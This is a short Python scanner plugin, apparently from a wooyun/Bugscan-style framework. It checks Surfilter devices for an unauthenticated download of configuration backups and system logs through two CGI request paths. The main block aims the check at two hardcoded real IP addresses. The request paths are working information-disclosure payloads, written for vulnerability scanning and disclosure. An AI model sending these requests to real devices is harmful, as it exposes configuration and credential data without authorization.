#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0102009
#__Author__ = 上善若水
#_PlugName_ = surfilter Plugin
#_FileName_ = surfilter.py

import urlparse
import re


def assign(service, arg):
    if service == "www":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)	

def audit(arg):
    payloads = ('cgi-bin/web_cgi?op_req=apply&module=conf_bakdown','cgi-bin/web_cgi?op_req=apply&module=syslog_management&opt=down&type=system')
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode, final_url = curl.curl2(url)
        if code == 200 and res.startswith("\x1F\x8B\x08\x00"): 
            security_hole(url)
        elif code == 200 and re.search(r"\d+\.\d+\.\d+\.\d+@",res):
            security_hole(url)
        else:
            pass
			
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://219.150.20.218/')[1])
    audit(assign('www', 'http://219.150.20.84/')[1])